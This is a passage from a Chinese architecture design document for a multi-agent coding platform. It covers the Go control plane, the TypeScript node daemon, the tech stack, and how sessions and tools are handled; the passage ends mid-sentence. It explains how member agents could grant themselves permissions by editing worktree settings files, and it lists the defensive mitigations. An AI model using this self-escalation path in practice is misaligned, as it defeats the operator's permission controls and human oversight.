# Agent Teams v2 架构

状态：设计稿（2026-11-14）。本目录的文件一起构成 v2 的实现约定：

| 文件 | 内容 |
| --- | --- |
| `architecture.md`（本文） | 总体结构、组件职责、技术选型、各流程、安全、部署、分阶段交付与迁移 |
| `protocol.md` | 控制台 ↔ 节点守护进程的 WebSocket 协议（v2） |
| `data-model.md` | PostgreSQL 表结构，以及和现有 `at_*` 表的对应 |
| `api.md` | 网页用的 REST + SSE 接口，按设计稿画板分组 |
| `office-layout.md` / `office-layout.schema.json` / `office.example.json` | 办公室布局 JSON 格式、Schema、和设计稿一致的示例 |

界面以设计稿为准：https://claude.ai/artifact/ETVxwwc77PFUpjsai9mmoi （Main、Overview、Thread、Deliverables、NewProject、ProjectSettings、Team、Nodes、GitHub、Admin、Login、Office、Mobile）。产品模型沿用 `docs/threads.md` 和 `docs/agent-comms.md`，本文只在必要处改动，改动处会写明。

---

## 1. 一句话

Go 写的控制台（REST + SSE + 节点 WebSocket + 调度器）存全部状态在 PostgreSQL，用 Valkey 做实时扇出和锁；每台节点跑一个 TypeScript 守护进程，用 Claude Agent SDK 托管 Claude Code 员工的**常驻会话**，用 `codex app-server` 托管 Codex 员工；员工的平台工具（派活、提问、set_status…）由守护进程在本机提供 MCP，调用经节点 WebSocket 转到控制台执行；Vue 网页（Element Plus）按设计稿重做，办公室由一个 JSON 布局文件驱动渲染。

## 2. 总体结构

```
                         浏览器（Vue 3 + Element Plus + Tailwind）
                         │  REST (JSON)   │  SSE /api/.../events (Last-Event-ID 可续)
                         ▼                ▼
┌──────────────────────── Caddy（TLS，flush_interval -1） ────────────────────────┐
└──────────────────────────────────────┬──────────────────────────────────────────┘
                                       ▼
┌──────────────────────────── control plane（Go，单二进制 `atctl`） ──────────────┐
│ httpapi (Gin + huma + Casbin)       sse hub          nodegw (WS /nodes/connect)  │
│ auth / projects / git / admin       ▲  ▲             │  链路注册、命令发件箱、ACK   │
│ threads / tasks / approvals         │  │             │  事件收件 → 各引擎           │
│ ┌─────────── 领域引擎（同进程 goroutine，状态全在 PG） ─────────────┐           │
│ │ orchestrator  会话编排（谁该有会话、开在哪台节点、恢复）          │           │
│ │ scheduler     任务池领取 / 依赖 / 主任务打勾                       │           │
│ │ toolsvc       平台工具（统筹/组长/成员）的实现，tool.call 入口     │           │
│ │ approvals     审批策略（跳过确认 / 本串全部放行 / 记住的规则）     │           │
│ │ status        员工状态机：事件 → 状态 → 落库 → 推送                │           │
│ │ delivery      分支 / 合并队列 / CI(Checks) / PR / 验收             │           │
│ │ github        App 令牌、REST 客户端、webhook（可选）、轮询          │           │
│ └────────────────────────────────────────────────────────────────────┘           │
└───────┬──────────────────────────────┬───────────────────────────────┬───────────┘
        ▼                              ▼
   PostgreSQL 17                  Valkey 9
   全部业务数据、事件流、           pub/sub 扇出、分布式锁、
   发件箱、审计                     限流计数、在线状态
        ▲
        │ WS（协议 v2，TLS，节点令牌）
┌───────┴──────────────── 节点守护进程（TypeScript / Node 22，`agent-teams-node`） ─────┐
│ link        连接、hello/版本协商、发件日志(outbox)、命令去重、重放                    │
│ sessions    ┌ ClaudeDriver：每个会话一个 Agent SDK query()（流式输入、interrupt、      │
│             │              canUseTool、hooks） → 内置 claude 2.1.x 子进程              │
│             └ CodexDriver：每个 CODEX_HOME 一个 `codex app-server`（JSON-RPC stdio），│
│                            一个员工 = 一个 Codex thread                                │
│ toolhost    平台 MCP：Claude 用进程内 SDK MCP server；Codex 用 127.0.0.1 回环 HTTP MCP │
│             两者把 tools/call 变成 WS `tool.call` 交给控制台                            │
│ git         clone / fetch / worktree add / cleanup / status（只做本地操作）           │
│ cred        git credential helper + gh 包装：按需向控制台要短期 GitHub 令牌，不落盘   │
└────────────────────────────────────────────────────────────────────────────────────┘
```

## 3. 组件与职责

### 3.1 控制台（Go，`/server`）

- **对外**：网页 REST（`/api/...`）、SSE（项目级 + 用户级）、节点 WebSocket（`/nodes/connect`，别名 `/nodes/v2/connect`）、GitHub App 回调（沿用 v1 路径 `/api/git/github-app/created`、`/installed`，必须不变，否则要去 GitHub 改 App 设置）、可选 webhook（`/api/git/github-app/webhook`）、`/install-node.sh`、`/node/dist/*`（守护进程发布包）、`/healthz`、`/readyz`、`/metrics`（只监听内网端口）。
- **领域引擎**（同一进程内的模块，状态全在 PG，进程可随时重启）：
  - `orchestrator`：根据项目 / 讨论串 / 任务状态算出“哪些员工该有会话”，挑节点，发 `session.open`；节点断线、会话出错、守护进程重启后负责恢复（`resume`）。
  - `scheduler`：任务池。按岗位领取、依赖、空闲实例、主任务自动打勾、失败重试。
  - `toolsvc`：所有平台工具的实现（见 §6）。守护进程只是转发。
  - `approvals`：审批请求的策略判断、卡片、答复回送。
  - `status`：员工状态机，事件落库、推送、回放。
  - `delivery`：讨论串分支、合并队列、CI、PR、验收、清理。
  - `github`：App JWT / 安装令牌缓存（进程内 + Valkey 共享），REST 客户端（分页、ETag、限速），Checks 轮询。
- **单实例起步，可横向扩展**：v2.0 先跑 1 个副本。所有状态在 PG；节点链路只挂在一个副本上，副本间用 Valkey 频道 `node:<id>:cmd` 转发命令（§11.4），以后加副本不改协议。调度器、合并队列这类“全局只能一个在跑”的循环用 PG advisory lock 选主。

### 3.2 节点守护进程（TypeScript，`/node`）

- 一台机器一个进程，systemd 用户服务，`Restart=always`。
- 托管会话（Claude / Codex）、本地 git 操作、平台工具转发、GitHub 凭证按需获取。
- **不做业务决策**：派给谁、是否放行、任务池，全在控制台。守护进程只执行明确的命令，以及在本机强制“这个会话能用哪些工具”（防线之一，见 §10）。

### 3.3 网页（Vue，`/web`）

- Vue 3 + Vite 7 + TypeScript + Element Plus + Pinia + vue-router 4 + vue-query 5，Tailwind 3 负责布局（设计令牌与之前的 React 版一致，页面外观和行为不变）。页面只用 `components/common`（平台积木）+ Element Plus（在 `styles/element.css` 里按令牌改了皮肤）。
- 接口类型由控制台导出的 OpenAPI 3.1 生成（`openapi-typescript` + `openapi-fetch`），不再手写 `lib/api.ts` 的类型；服务端数据走 vue-query，SSE 事件直接写进 query 缓存。
- 输入框（统筹对话和组长对话共用 `Composer.vue`）：左下角一个“+”菜单（添加文件或照片、斜杠命令、引用），右下角麦克风（管理员开了语音输入才有）和发送。“/” 弹出平台命令（前端自己执行）和员工会话报上来的技能；“@” 引用仓库文件、讨论串、交付物和记忆文件，由控制台按本项目解析后接在投递给员工的文字后面（`api.md` §3.2）。语音输入：控制台用密封保存的 OpenAI Key 签 120 秒的临时密钥，浏览器直接与 OpenAI 建 WebRTC 实时转写：声音不经过控制台，平台 Key 不离开控制台（`voice.md`）。
- 办公室页：Canvas 2D 画场景和人物，DOM 叠加层画气泡、名牌、门牌和可点区域；布局来自 JSON（`office-layout.md`）。

### 3.4 共享协议（`/protocol`）

- 节点协议、平台工具、办公室布局的 **JSON Schema（draft 2020-12）是唯一来源**；Go 结构体和 TS 类型都从它生成，CI 检查生成物没被手改。
- REST 接口不放这里：由 Go 代码（huma）生成 OpenAPI，再生成网页的 TS 类型。

## 4. 仓库布局

一个仓库（monorepo）。Python v1 已于 2026-11-15 退役并从仓库删除。

```
/server                 Go module  github.com/<org>/agent-teams/server
  cmd/atctl/            main：serve | migrate | healthcheck | openapi | admin（重置密码等运维命令）
  internal/httpapi/     Gin 路由、huma 操作（humagin）、中间件（会话、CSRF、限流、审计）
  internal/httpapi/authz/ Casbin 模型与策略（model.conf、policy.csv，嵌入二进制）
  internal/sse/         SSE hub（Valkey 订阅 + PG 回放）
  internal/nodegw/      节点 WebSocket、链路注册、命令发件箱
  internal/orchestrator/ internal/scheduler/ internal/toolsvc/ internal/approvals/
  internal/status/      internal/delivery/  internal/github/   internal/office/
  internal/auth/        scrypt、会话、Fernet（兼容 v1 的 SecretBox）
  internal/store/       GORM 模型（对应 goose 建的表）、连接池、事务封装、少量手写 SQL
  migrations/           goose SQL 迁移（嵌入二进制）
/node                   TS 守护进程（npm 包 @agent-teams/node）
  src/link/  src/sessions/claude/  src/sessions/codex/  src/toolhost/
  src/git/   src/cred/   src/journal/   src/cli.ts
  src/codex-protocol/   由 `codex app-server generate-ts` 生成，提交入库，锁定 CLI 版本
/web                    Vue 应用（构建产物由控制台静态服务）
  src/office/           布局加载、场景编译、渲染器、寻路、回放
/protocol
  schemas/node/*.json   节点协议消息
  schemas/tools/*.json  平台工具参数/返回
  schemas/office/office-layout.schema.json（= docs/v2/office-layout.schema.json）
  gen/go/  gen/ts/      生成物
/office                 默认办公室布局 JSON 与像素素材（部署时挂进控制台容器）
/deploy                 compose（docker-compose.yml + compose.sh）、env.example、e2e/（本机端到端测试）
```

## 5. 技术选型（带版本和理由）

版本是开工时的下限；开工当天锁到当时最新补丁版本，之后由 Renovate 升级。

### 5.1 控制台（Go）

| 用途 | 选择 | 理由 |
| --- | --- | --- |
| 语言 | Go 1.25（`go.mod` 写 `go 1.25`，`toolchain` 锁补丁） | 标准库 `net/http` 路由模式、`log/slog`、`iter` 都够用 |
| 路由 | `github.com/gin-gonic/gin` v1.12 | 中间件生态成熟；huma 有 Gin 适配器（`humagin`）；节点 WebSocket、SSE、静态文件都挂在同一个引擎上 |
| API 层 | `github.com/danielgtaylor/huma/v2` v2.40（Gin 适配器） | 由 Go 结构体生成 OpenAPI 3.1 和校验，网页类型自动生成；原生支持 SSE 操作 |
| 授权 | `github.com/casbin/casbin/v2` v2.135 | 路由级 RBAC：（角色, Gin 路由模板, 方法），角色 anonymous < user < admin；模型和路由策略嵌入二进制；用户 → 角色（每人一行 `g, <用户 id>, admin|user`）只存在 `casbin_rule` 表里（00110 从 `at_users.role` 一次性迁入并删列），经 enforcer 读写，多副本每 10 s 重载。数据归属（只能看自己的项目、讨论串…）仍由按调用者过滤的查询保证，别人的数据一律 404 |
| ORM | `gorm.io/gorm` v1.31 + `gorm.io/driver/postgres` v1.6（底层 `pgx/v5` 连接池） | 模型对应 goose 建的表（`TableName` + 列标签），行锁用 `clause.Locking`；UNION 事件流、CTE upsert、`UPDATE … RETURNING` 等约 70 条语句仍是手写 SQL（`Raw`/`Exec`，`$n` 占位符）。**不用 AutoMigrate** |
| PG 驱动 | `github.com/jackc/pgx/v5` v5.13（`pgxpool`，GORM 的连接池；advisory lock 用独占连接） | 最快、支持 `LISTEN/NOTIFY`、`COPY`、类型齐全 |
| 迁移 | `github.com/pressly/goose/v3` v3.30，SQL 迁移嵌入二进制，**表结构的唯一来源** | 支持 Go 迁移（数据转换，例如团队 YAML → 岗位模板），有 `goose_db_version` 表；`atctl migrate up` 在启动前单独跑；测试检查每个 GORM 模型字段都对得上迁移建的表 |
| Valkey | `github.com/valkey-io/valkey-go` v1.0 | Valkey 官方客户端，自动 pipeline、RESP3、客户端缓存；pub/sub 和锁都用它 |
| WebSocket | `github.com/coder/websocket` v1.8 | 上下文友好、并发写安全、支持压缩；`gorilla/websocket` 维护不稳定 |
| JSON Schema 校验 | `github.com/santhosh-tekuri/jsonschema/v6` | draft 2020-12 完整实现；校验节点消息（开发 / 测试环境全量，生产抽样）和办公室布局（每次加载） |
| Schema → Go | `github.com/omissis/go-jsonschema`（`go generate`） | 从 `/protocol/schemas` 生成结构体 |
| 密码 | `golang.org/x/crypto/scrypt` | 兼容 v1 的 `scrypt$N$r$p$salt$digest` |
| 密封 | `github.com/fernet/fernet-go` | 兼容 v1 SecretBox：key = `urlsafe_b64(sha256(AGENT_TEAMS_SECRET_KEY))` |
| GitHub | `github.com/google/go-github`（开工时最新大版本）+ `github.com/bradleyfalzon/ghinstallation/v2` | App JWT、安装令牌、分页；令牌缓存外面再包一层 Valkey 共享缓存 |
| 文件监听 | `github.com/fsnotify/fsnotify` v1.8 | 办公室布局文件热更新 |
| 日志 / 指标 / 追踪 | `log/slog`（JSON）、`prometheus/client_golang`、OpenTelemetry Go（OTLP，可选） | 见 §13 |
| MCP | **v2.0 控制台不提供 MCP 服务** | 平台工具由守护进程在本机提供（§6.3），控制台只收 `tool.call`。以后若要对外开放 MCP，用官方 `github.com/modelcontextprotocol/go-sdk`（streamable HTTP handler），备选 `mark3labs/mcp-go` |

### 5.2 守护进程（TypeScript）

| 用途 | 选择 | 理由 |
| --- | --- | --- |
| 运行时 | Node.js 22 LTS（≥22.12；24 LTS 也测） | Agent SDK 要求 ≥18.14；22 有稳定的 `fetch`、`WebSocket` 客户端、`--env-file` |
| Claude | `@anthropic-ai/claude-agent-sdk` **0.3.325，精确锁版本** | 实测：节点已有的订阅登录可用（`apiKeySource:'none'`）；流式输入多轮同一会话；锁 SDK 即锁内置 `claude` 2.1.325 |
| Codex | `@openai/codex` CLI **0.169.0，精确锁版本**，跑 `codex app-server`（stdio JSON-RPC） | 只有 app-server 能发审批请求、`turn/steer` 中途插话、`turn/interrupt`、`thread/resume`；`@openai/codex-sdk` 只包了 `codex exec`，审批被强制为 Never，不能用 |
| WS 客户端 | `ws` 8.18 | 稳定、支持 ping/pong、`maxPayload`、代理 |
| MCP（Codex 回环） | `@modelcontextprotocol/sdk` 1.32（Agent SDK 的 peer 依赖，同一份） | streamable HTTP server，实测 Codex 能连 |
| 校验 | `ajv` 8（JSON Schema 2020-12）+ `zod` 4（Agent SDK 的 `tool()` 需要） | 入站命令用 ajv 按 `/protocol` 校验 |
| 本地日志 | 追加写 JSONL（`state/outbox/*.jsonl`、`state/sessions/*.json`） | 和 v1 一样朴素可靠，不引入 SQLite；文件小、可读、好排查 |
| 日志 | `pino` 9 | JSON 日志，journald 友好 |
| 打包 | `esbuild` 0.25 打成 `dist/node.mjs`，**`@anthropic-ai/claude-agent-sdk`、`@openai/codex`、`@modelcontextprotocol/sdk` 标为 `external`**，作为普通依赖装在 `dist/` 旁边的 `node_modules`（tgz 带精确锁定的 `package-lock.json`，`npm ci --omit=dev`） | 这两个包按自身模块位置查找平台二进制（`<pkg>-linux-<arch>/claude`、codex 原生二进制），打进单文件会找不到。控制台 `/node/dist/` 发布签名的 tgz；不再从 Git 分支安装（v1 问题 13） |

### 5.3 网页

| 用途 | 选择 | 理由 |
| --- | --- | --- |
| 框架 | Vue 3.5 + Vite 7 + TypeScript 5.9（`vue-tsc` 类型检查），vue-router 4，Pinia 3 | 单文件组件、`<script setup>`；路由路径与之前的 React 版完全一致 |
| UI | Element Plus 2.14（按组件自动引入）+ Tailwind 3.4 | Element Plus 做基础控件，按设计令牌改皮肤；Tailwind 类名和设计稿一致 |
| 数据 | `@tanstack/vue-query` 5 + `openapi-fetch` + `openapi-typescript` 7 | 类型来自 OpenAPI，SSE 事件直接写进 query 缓存 |
| 办公室渲染 | Canvas 2D（`imageSmoothingEnabled=false`）+ DOM 叠加层，**不引入 PixiJS** | 几十个人物、几百件家具 Canvas 2D 足够；中文气泡用 DOM 渲染更清晰、可点、可读屏；零依赖，布局热更新只需重编译场景 |
| 布局编辑 | 先用 JSON 文本编辑（CodeMirror 6 + JSON Schema 补全），可视化编辑器后续再说 | 用户要求“只改 JSON 就能重画” |

### 5.4 共享类型生成

- `/protocol/schemas/**/*.json` → Go：`go-jsonschema`；TS：`json-schema-to-typescript` 15；运行时校验：Go `santhosh-tekuri/jsonschema`、TS `ajv`。
- REST：huma 生成 `openapi.json`（`atctl openapi > web/src/api/openapi.json`），网页 `openapi-typescript` 生成 `schema.d.ts`。
- `make gen` 一次生成全部；CI 跑 `make gen && git diff --exit-code`。

## 6. 员工、会话与平台工具

### 6.1 三层角色到会话的映射

成员是**项目级固定编制**（[shared-members.md](shared-members.md) §2）：岗位模板的 `count` 是项目里这个岗位配几个人（`<岗位>-<n>`，`at_employees.thread_id = NULL`），所有讨论串共用；开讨论串只建组长 `lead-<no>`。成员同一时间只做一个任务、只有一个会话，会话开在当前任务所在讨论串的 worktree（`at_agent_sessions.thread_id`），换讨论串就关掉旧会话（`switch_thread`）、在新讨论串开新会话并附交接摘要。项目成员的技能 / 插件目录是 `<project>/project/<name>`（`session.open.employee.scope = project`）。迁移前随讨论串建的旧成员仍在自己的讨论串做完手里的任务。

| 层级 | 每个… | 会话类型 | 工作目录 | 内置工具 | 权限 | 平台工具集 |
| --- | --- | --- | --- | --- | --- | --- |
| 项目统筹（coordinator） | 项目 1 个 | Claude，常驻 | `projects/<pid>/coordinator`（空目录，不克隆） | `tools: []`（一个内置工具都没有） | `permissionMode:'dontAsk'` + PreToolUse 钩子只放行 `mcp__platform__*` | coordinator |
| 组长（lead） | 讨论串 1 个 | Claude（或 Codex），常驻 | `projects/<pid>/threads/<no>/lead`（讨论串分支的 worktree） | `Read, Glob, Grep, Bash` | `dontAsk`；`disallowedTools: Edit, Write, NotebookEdit`；**只读策略**（§10.2：Bash argv 白名单 + Claude Bash 沙箱无可写路径 + 文件工具限 cwd） | lead |
| 成员（member） | 项目 × 岗位 × count（所有讨论串共用） | Claude 或 Codex，常驻（一次一个会话，开在当前讨论串） | `projects/<pid>/threads/<no>/<name>`（`<no>` = 当前任务的讨论串，分支 `thread/<no>/<name>`） | 按岗位模板 | 岗位 `permission_mode`（§9.1）：`bypass`（默认）= `bypassPermissions`，任何节点上都不弹权限确认；`ask` = `default`（除读文件外都走 canUseTool → 审批路由）；岗位 `read_only`（审查岗、决策岗默认开）= 与组长相同的只读策略（`dontAsk`，与权限模式无关） | member（+ `can_delegate` 时有派子任务） |

Codex 对应：组长和 `read_only` 岗位 `sandbox: read-only, approvalPolicy: never`；`ask` 成员 `sandbox: workspace-write, approvalPolicy: untrusted`，并在 `thread/start.config` 里设 `sandbox_workspace_write.writable_roots = [<shared>/.git]`（worktree 的对象库和 refs 在共享克隆的 `.git` 里，不在 cwd 下，否则每次 `git commit` 都会被沙箱拦或弹审批）和 `sandbox_workspace_write.network_access = true`（装依赖需要；推送不靠它，见 §8.1）；`bypass` 成员（默认）= `danger-full-access + never`，任何节点上都一样。P3 的 SDK/Codex 验收脚本要实测 Codex 成员在 worktree 里能 `git commit`。

所有 Claude 会话固定：

- `settingSources: []`（**所有层级**，不读节点用户的 `~/.claude`，也不读仓库的 `.claude/settings.json`、`.mcp.json`：那里面可以有钩子（任意 shell 命令，不经权限检查）、`permissions.allow`、`env` 和 MCP 服务器，而成员能在自己的 worktree 里改这些文件，下一次 park→resume 就会被读入，等于自己给自己放权，也会破坏组长的只读保证）。仓库的 `CLAUDE.md` 由控制台经 GitHub API 从**基准分支**读取（不是从 worktree 读），拼进 `systemPrompt.append`；讨论串开工时读一次，基准分支变化后下一次开会话时刷新。若以后要重新考虑 `'project'`，必须同时通过 `settings` 传 `disableAllHooks: true` 并拒绝项目 MCP 服务器。
- `permissionMode` **总是显式设置**：写代码的成员 `bypassPermissions`（同时 `allowDangerouslySkipPermissions: true`，守护进程看到 `bypassPermissions` 也会自己补上）或 `default`（`ask` 岗位）；统筹、组长、只读岗位 `dontAsk`。
- `systemPrompt: {type:'preset', preset:'claude_code', append: <平台说明 + 角色说明 + 项目 CLAUDE.md + 仓库 + 项目指令 + 项目记忆（使用说明 + MEMORY.md，§6.7）+ 名单>}`。每次开会话（包括 resume、换节点）都重新生成，所以用户改的项目指令和员工新写的记忆在下一个会话生效。
- `env` 由守护进程**逐项构造**（SDK 的 `env` 是替换不是合并）：`PATH`、`HOME`（见 §10.3，指向员工专用的 HOME）、`LANG`、`MCP_TOOL_TIMEOUT=86400000`、`CLAUDE_AGENT_SDK_CLIENT_APP=agent-teams-node/<ver>`、git 凭证相关变量，再加 `node.env` 里 `AGENT_TEAMS_PASS_ENV` 列出的认证与网络变量（默认允许名单：`ANTHROPIC_API_KEY`、`ANTHROPIC_BASE_URL`、`ANTHROPIC_AUTH_TOKEN`、`CLAUDE_CODE_USE_BEDROCK`、`CLAUDE_CODE_USE_VERTEX`、`AWS_*`、`CLOUD_ML_REGION`、`ANTHROPIC_VERTEX_PROJECT_ID`、`GOOGLE_APPLICATION_CREDENTIALS`、`HTTPS_PROXY`、`HTTP_PROXY`、`NO_PROXY`、`NODE_EXTRA_CA_CERTS`、`SSL_CERT_FILE`；Codex 另加 `OPENAI_API_KEY`、`OPENAI_BASE_URL`），节点 hello 报告 `auth: api_key` 时据此生效。`AGENT_TEAMS_NODE_TOKEN` 和 `AGENT_TEAMS_*` 前缀**永远剔除**，名单里写了也不带。
- `includeHookEvents: true`；Bash 沙箱按 §10.3 开启。
- `canUseTool` 返回 `updatedPermissions` 前，守护进程把每一条 `PermissionUpdate.destination` **改写为 `'session'`**（SDK 建议里的 `localSettings`/`projectSettings` 会往 worktree 写 `.claude/settings.local.json`）。

### 6.2 “逻辑会话”和“进程”分开

- **逻辑会话**（`at_agent_sessions` 一行）：属于某个员工实例，记录 SDK `session_id` 或 Codex `thread.id`、节点、cwd、分支、状态。员工存在多久它就存在多久（统筹跟项目一样久，组长和成员跟讨论串一样久）。
- **进程**：Claude 会话对应一个 `query()` 子进程（约 250 MB）。空闲超过 `park_after`（默认 15 分钟，无运行中的回合、无待审批）就 `close()` 掉进程，会话标为 `parked`；下一条消息到来时用 `resume: <session_id>` 重开。这样一台节点可以挂几十个逻辑会话，同时活跃的进程默认不限；节点页或守护进程 `--max-sessions` 设了 `max_active_sessions` 时才按它限制（满了先停放最久空闲的会话，还在启动中的会话不算空闲）。
- Codex：一个 `codex app-server` 托管该节点所有 Codex 会话（同一 `CODEX_HOME`）；空闲 thread 不占额外进程，app-server 重启后 `thread/resume {excludeTurns:true}`。
- 守护进程重启：从 `state/sessions/*.json` 知道本机有哪些逻辑会话，但**不主动恢复**；等控制台在重连后按需重新 `session.open {resume}`（控制台是唯一的真相）。控制台记录为 `turn_running`、之后却变成 `parked`（关机时停放的 `session.state`，或重启后的报告）或重新 `starting`（会话进程崩溃后自动重启）的会话，说明回合被打断了；丢了待审批请求的会话同样如此。控制台给这个员工（成员或组长）发一条系统消息（“守护进程重启打断了你上一个回合，请继续”，并列出失效的审批请求和仍在等待回答的提问），会话随之按 SDK session id resume 接着干，不会卡在进行中的任务上；同一次中断只发一次。重连对账后，若某个运行中的讨论串没有任何员工在工作、没有未处理的卡片或提问、也没有在途消息，组长收到一条提醒（这条提醒已是最新消息时不重复）。
- **会话钉在节点上**：Claude 转录（员工 HOME 下的 `.claude/projects`）和 Codex rollout（`$CODEX_HOME/sessions`）只存在于跑过它的节点，所以 `resume` 只发给 `at_agent_sessions.node_id` 那台节点。必须换节点时（节点被删、离线超过 `rehome_after`（默认 30 分钟）且员工有待办任务、节点 drain），orchestrator 关闭旧逻辑会话，在新节点开一个**全新**会话（`resume: null`），第一条消息是平台生成的**会话恢复摘要**（`handoffSummary`）：员工身份、主任务计划、（组长）全部任务及状态、（成员）当前任务和分支、还没回答的提问、这个员工对话里最近 20 条已送达的消息和它自己的回复（用户 / 你 / 平台，统筹按自己的对话取，不再是空的）。不做转录同步（SDK `sessionStore` 以后可作为改进）。
- **resume 失败**（守护进程回 `session.opened {resume_failed: true, error}`：转录被删、`~/.claude` 被清、换了节点、文件损坏）时自动走同一个交接流程，不需要人处理。守护进程在三处识别：`session.open {resume}`、停放的会话被下一条消息唤醒（unpark）、崩溃后的自动重启；它只回 `session.opened {resume_failed}`、删掉本机记录，**不先发 `session.state closed`**（否则控制台会先把行关掉，看不到 resume_failed）。控制台关闭旧逻辑会话、开新会话，第一条消息 = 恢复摘要 + `---` + 旧会话**没送到的消息**（它最后一次 `session.open` 的 `first_message` 和未确认送达的 `session.send`，按发出顺序，用第一条的 `msg_id`，其余标为已送达），所以触发恢复的那条用户消息不会丢；统筹和组长的对话里插一条 `kind = resumed` 的系统消息，网页显示成一行淡色的“会话已恢复”。
- **员工的会话关掉后再开**：讨论串结束（`thread_done`）后又被重新打开、用户被停用后恢复（`employee_removed`）、节点报告关闭（`node_closed`）的员工，下一条消息开的新逻辑会话带 `resume: {sdk_session_id: 上一个会话的}`，接着原来的对话；转录不在了就是上面的 resume 失败流程。策略违规（`policy_violation`）关掉的会话不续接。
- 各种中断的结果：空闲停放 → 下一条消息按 SDK session id resume；守护进程 SIGTERM（停放全部会话）或 SIGKILL / 节点重启（本机记录按 `parked` 读回，首条投递前查转录去重）→ 重连对账后按需 resume，被打断的回合收到“守护进程重启”系统消息；会话进程崩溃 → 自动 resume 最多 3 次，转录丢了直接走 resume 失败；控制台重启 → 状态全在 PostgreSQL，阻塞调用照常等待；转录丢失 → 恢复摘要。`deploy/e2e/run_resume.mjs` 用真实 Claude 逐个验证（每次中断后问统筹之前说过的暗号）。

### 6.3 平台工具：守护进程本地 MCP + WS 转发

v1 的 `/mcp` 每任务一个 bearer 令牌，存在内存里，重启全失效，令牌还出现在命令行里（v1 问题 2、12）。v2 改为：

```
Claude 会话 ──(进程内 SDK MCP server "platform")──┐
                                                  ├─► toolhost ──WS tool.call{call_id}──► 控制台 toolsvc
Codex 会话 ──(http://127.0.0.1:<port>/mcp/<sid>/<每次 ─┘                ◄── tool.result{call_id} ──
              start/resume 换新的随机秘密>)
```

- 会话打开时，控制台在 `session.open` 里下发该会话的工具清单（名字、描述、JSON Schema，来自 `/protocol/schemas/tools`），守护进程据此注册工具。工具名在 Claude 里是 `mcp__platform__<tool>`，在 Codex 里是 namespace `mcp__platform` 下的 `<tool>`（实测 Codex 只认 namespace 形式）。
- Codex 回环端点只监听 127.0.0.1。秘密放在**每会话 URL 路径**里（`/mcp/<sid>/<随机 32 字节>`），不用 `http_headers`，因为 `thread/start.config` 可能被写进 `$CODEX_HOME` 下的 rollout 文件。每次 `thread/start` **和每次 `thread/resume`** 都重新下发完整的 `mcp_servers.platform` 配置并换新路径（旧路径立即失效），所以守护进程重启后令牌重生也不影响已恢复的 thread；rollout 里即使留下旧 URL 也已作废。其余配置：`default_tools_approval_mode = "approve"`（否则每次调用都弹 elicitation）、`tool_timeout_sec = 86400`。P3 验收脚本检查 rollout 是否持久化了 config，以及 `thread/resume` 带新 config 是否生效；若 resume 不接受 mcp 配置，退路是 resume 后立即 `config/value/write` 覆盖该会话的 `mcp_servers.platform.url`。
- 守护进程把调用包成 `tool.call {call_id, session_id, tool, args, tool_use_id?}`。`call_id` 由**守护进程在处理器被调用时生成**（`tc_` + ULID，写进本机日志后再发，重启后重发用同一个值）；进程内 SDK MCP 处理器拿不到 Claude 的 tool_use_id，能通过 PreToolUse 钩子（同一回合、同工具名、同参数）对上时另外记 `tool_use_id`，Codex 记 item id，仅供排查和办公室显示。**幂等**：控制台在 `at_tool_calls`（主键 `(session_id, call_id)`）记下，断线重连后守护进程重发未完成的调用，控制台对已完成的直接回原结果、对进行中的不重复执行。
- 阻塞型工具（`ask_lead`、`ask_user`、`request_review`、`wait_task`）在控制台挂起，答复后才回 `tool.result`。控制台重启不影响（调用记录在 PG，答复事件触发补发结果）。
- **未验证点与退路**：进程内 SDK MCP 工具处理器能否挂起数小时没有实测。退路（开关 `tools.blocking=false`）：阻塞型工具改为立即返回“已提问 q5，答案到了会作为消息发给你，请先结束本回合等待”，答案到达时用 `session.send {priority:'now'}` 推进会话。常驻流式会话让这个退路很自然，P3 先实测再定默认值。

平台工具清单（在 v1 / threads.md 基础上）：

- **coordinator**：`open_thread(title, brief, roles?, repos?, message_id?)`（message_id = 这次派发对应的用户原话，不写则取统筹上一条回复之后送达的用户本人消息里最新的一条，定时任务消息不算，取不到就没有原话；原话的图片/PDF 随 brief 发给组长，讨论串的 `dispatch.source` 展示它）、`list_threads(status?)`、`thread_status(no)`（除原始 status 外给一行“状态说明”，口径和页面的 threadPhase 一致：`core.PhaseOf`）、`message_thread(no, text)`（讨论串 done / failed 时先按 `Reopen(cause "coordinator")` 重新打开再投给组长，对话里记“统筹发来新消息，讨论串重新打开。”，不再回头通知统筹；archived 拒绝，要先取消归档）、`forward_to_thread(thread_no | new_thread{title}, message_ids? | latest?, note?)`（把用户在项目对话里的原话连同图片、附件、@ 引用原样转给组长，组长当作用户本人的话；用户的话属于已有讨论串时用它代替转述，见 `api.md` §3.2 `POST /api/conversations/{cid}/forward`）、`ask_user(question, options? | questions[])`（不阻塞；结构化提问见 §6.6）、`remember(text)`（往 MEMORY.md 追加一行）、`set_status(text, kind?)`、`memory_list` / `memory_read(name)` / `memory_write(name, description?, content)` / `memory_delete(name)`（§6.7）、`list_deliverables(thread?, kind?)`（只看列表，§6.5）、共享文件四件套 `list_shared_files` / `read_shared_file` / `write_shared_file` / `delete_shared_file`（见下）。
- **lead**：`update_plan(steps)`（主任务）、`assign_task(assignee, instruction, main, depends_on?, kind?)`（assignee 可以是岗位名 → 进任务池）、`list_tasks`、`cancel_task`、`reply_to(question_id, answer)`、`review_permission(request_id, decision: allow|deny|ask_user, reason)`（成员的权限请求，§9.2）、`broadcast`、`send_message`、`ask_user`（不阻塞）、`enqueue_merge(member | task_id)`（进合并队列，取代 v1 设计里的 `merge_member` 直接合并）、`open_pr(title, body)`、`finish(summary)`、`publish_deliverable(kind, title, url)`、`publish_file(path, kind, title, deliverable_id?)`、`list_deliverables`、`read_deliverable`（§6.5）、`set_status`、`tell_user(text)`（立即在讨论串对话里发一条 role=leader 消息、不结束本轮；收到 brief 后先用它给用户发回执）、四个 `memory_*` 工具（§6.7）、共享文件四件套（见下）。成员只有 `memory_list` / `memory_read`。`finish(summary)` 除了写 `at_threads.summary`，还把总结作为一节 `## #<no> 标题` 追加到记忆文件 `thread-summaries.md`（只留最近 30 节，MEMORY.md 自动链接它）并发 `memory` 事件。讨论串没有任何仓库改动（没有讨论串分支、没有 PR、合并队列为空）时，`finish` 在主任务和小任务都结束后让讨论串结束（只读的调研、答疑不需要开 PR，合并策略只对有 PR 的讨论串生效）：结束要等组长这一回合结束，finish 之后写的最终回复先入库，再 done（见 §8.4“结束不切断组长”）；有改动但还没开 PR 时提示先 `open_pr`。讨论串里还有等用户回答的问题卡片（`kind = question`，组长或成员的 `ask_user`）时，`open_pr` 和 `finish` 都被拒绝（“还有 n 个问题在等用户回答”），合并循环也不会把 PR 